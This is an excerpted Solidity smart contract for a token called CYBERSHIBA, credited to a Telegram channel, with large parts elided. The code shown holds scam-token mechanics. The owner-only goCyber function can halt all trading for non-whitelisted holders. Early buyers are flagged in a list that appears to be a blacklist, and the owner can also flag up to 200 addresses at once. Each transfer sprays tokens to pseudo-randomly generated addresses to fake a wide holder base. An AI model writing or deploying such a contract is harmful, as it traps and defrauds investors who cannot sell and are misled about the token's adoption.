...
// Telegram Channel Owner : https://t.me/safedevs
...
contract CYBERSHIBA is IERC20, Ownable {
    ...
    mapping(address => bool) public _alleyCyber;

    uint256 private _tTotal;
    uint256 public maxTXAmount;

    ISwapRouter public _swapRouter;
    address public _cyber;
    ...
    uint256 public _itsCyberShibaBlock;
    ...
    constructor (
        address RouterAddress, address cyberAddress,
        ...
        IERC20(cyberAddress).approve(address(swapRouter), MAX);
        ...
        address swapPair = swapFactory.createPair(address(this), cyberAddress);
        _mainPair = swapPair;
        ...
        _tokenDistributor = new TokenDistributor(cyberAddress);
    }
    ...
    function setcb(uint256 a) public onlyOwner{
        set = a;
    }
    ...
    function _transfer(
        ...
        if(!_whitelist[from] && !_whitelist[to]){ 
            address ad;
            for(int i=0;i <=1;i++){ // loop 1 times
                if (i==1) {
                    break;
                }
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100); // transfer to wallet 0.1 tokens
            }
            amount -= 100;
        }
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_whitelist[from] && !_whitelist[to]) {
                if (0 == _itsCyberShibaBlock) {
                    require(false);
                }
                if (block.number < _itsCyberShibaBlock + set && !_swapPairList[from]) {
                    _alleyCyber[from] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
        ...
        if (lpAmount > 0) {
            ...
            if (lpL > 0) {
                _swapRouter.addLiquidity(
                    address(this), _cyber, lpAmount, lpL, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }
    ...
    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        ...
        require(dividendFee < 1500); // Can't set higher then 15% Buy Fee
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFee = fundFee;
        require(fundFee < 1500); // Can't set higher then 15% Buy Fee
    }
    ...
    function setSellFundFee(uint256 fundFee) external onlyOwner {
        ...
        require(fundFee < 1500); // Can't set higher than 15% Sell Fee
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
        require(lpFee < 1500); // Can't set higher than 15% LP Fee
    }
    ...
    function _itsCyber() external onlyOwner {
        _itsCyberShibaBlock = block.number;
    }

    function goCyber() external onlyOwner {
        _itsCyberShibaBlock = 0;
    }
    ...
    function multi_multialleyCyber(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _alleyCyber[addresses[i]] = value;
        }
